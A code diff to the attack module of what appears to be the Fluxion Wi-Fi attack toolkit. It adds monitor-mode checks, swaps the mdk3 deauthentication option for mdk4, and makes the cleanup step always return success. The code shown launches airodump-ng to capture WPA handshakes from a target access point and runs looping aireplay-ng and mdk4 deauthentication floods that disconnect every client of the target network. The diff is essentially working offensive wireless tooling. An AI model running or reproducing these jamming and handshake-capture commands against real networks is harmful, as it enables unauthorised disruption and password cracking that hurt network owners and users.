@@ -145,6 +145,21 @@ handshake_snooper_start_captor() {
 
   handshake_snooper_stop_captor
 
+  # Ensure jammer interface is in monitor mode and UP before starting captor
+  # This prevents "interface down" errors during tracker restarts
+  # Only set mode if not already in monitor mode to avoid disrupting the interface
+  echo "Verifying captor interface monitor mode..." > $FLUXIONOutputDevice
+  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
+  if [ "$currentMode" != "monitor" ]; then
+    echo "Setting captor interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
+    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
+      echo "Warning: Failed to set captor interface to monitor mode" > $FLUXIONOutputDevice
+    fi
+    sleep 1
+  else
+    echo "Captor interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+  fi
+
   xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
     $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
     airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
@@ -171,10 +186,23 @@ handshake_snooper_start_deauthenticator() {
 
   handshake_snooper_stop_deauthenticator
 
+  # Ensure jammer interface is in monitor mode before starting
+  # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
+  # Only set mode if not already in monitor mode to avoid disrupting the interface
+  echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
+  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
+  if [ "$currentMode" != "monitor" ]; then
+    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
+    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
+      echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
+    fi
+    sleep 1
+  else
+    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+  fi
+
   # Prepare deauthenticators
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
-    "$HandshakeSnooperMdk3MethodOption")
-      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst ;;
     "$HandshakeSnooperMdk4MethodOption")
       echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
   esac
@@ -187,17 +215,11 @@ handshake_snooper_start_deauthenticator() {
         "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
-    "$HandshakeSnooperMdk3MethodOption")
+    "$HandshakeSnooperMdk4MethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
+        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
       HandshakeSnooperDeauthenticatorPID=$!
-    ;;
-    "$HandshakeSnooperMdk4MethodOption")
-            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
-            HandshakeSnooperDeauthenticatorPID=$!
     ;;
   esac
 }
@@ -448,6 +470,9 @@ unprep_attack() {
   handshake_snooper_unset_deauthenticator_identifier
 
   sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"
+
+  # Always return success to allow tracker channel change handling to continue
+  return 0
 }
 
 prep_attack() {
